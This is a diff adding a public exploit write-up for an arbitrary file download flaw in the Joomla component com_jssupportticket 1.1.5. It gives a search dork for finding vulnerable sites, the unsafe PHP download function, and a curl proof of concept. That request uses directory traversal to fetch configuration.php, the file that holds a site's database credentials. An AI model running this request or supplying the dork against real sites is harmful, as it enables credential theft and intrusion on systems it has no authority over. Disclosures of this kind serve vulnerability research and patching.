@@ -1,0 +1,51 @@
+#Exploit Title: Joomla! component com_jssupportticket - Arbitrary File Download
+#Dork: inurl:"index.php?option=com_jssupportticket"
+#Date: 08.08.19
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: http://joomsky.com/
+#Software Link: https://www.joomsky.com/46/download/1.html
+#Version: 1.1.5
+#Tested on: Debian/nginx/joomla 3.9.0
+#####################################
+#Vulnerability details:
+#####################################
+Vulnerable code is in line 1411 in file admin/models/ticket.php
+
+  1382	    function getDownloadAttachmentByName($file_name,$id){
+  1383	        if(empty($file_name)) return false;
+  1384	        if(!is_numeric($id)) return false;
+  1385	        $db = JFactory::getDbo();
+  1386	        $filename = str_replace(' ', '_',$file_name);
+  1387	        $query = "SELECT attachmentdir FROM `#__js_ticket_tickets` WHERE id = ".$id;
+  1388	        $db->setQuery($query);
+  1389	        $foldername = $db->loadResult();
+  1390	
+  1391	        $datadirectory = $this->getJSModel('config')->getConfigurationByName('data_directory');
+  1392	        $base = JPATH_BASE;
+  1393	        if(JFactory::getApplication()->isAdmin()){
+  1394	            $base = substr($base, 0, strlen($base) - 14); //remove administrator    
+  1395	        }  
+  1396	        $path = $base.'/'.$datadirectory;
+  1397	        $path = $path . '/attachmentdata';
+  1398	        $path = $path . '/ticket/' . $foldername;
+  1399	        $file = $path . '/' . $filename;
+  1400	
+  1401	        header('Content-Description: File Transfer');
+  1402	        header('Content-Type: application/octet-stream');
+  1403	        header('Content-Disposition: attachment; filename=' . basename($file));
+  1404	        header('Content-Transfer-Encoding: binary');
+  1405	        header('Expires: 0');
+  1406	        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+  1407	        header('Pragma: public');
+  1408	        header('Content-Length: ' . filesize($file));
+  1409	        //ob_clean();
+  1410	        flush();
+  1411	        readfile($file);		//!!!
+  1412	        exit();
+  1413	        exit;
+  1414	    }
+
+#####################################
+#PoC:
+#####################################
+$> curl -X GET -i "http://localhost/index.php?option=com_jssupportticket&c=ticket&task=downloadbyname&id=0&name=../../../configuration.php"
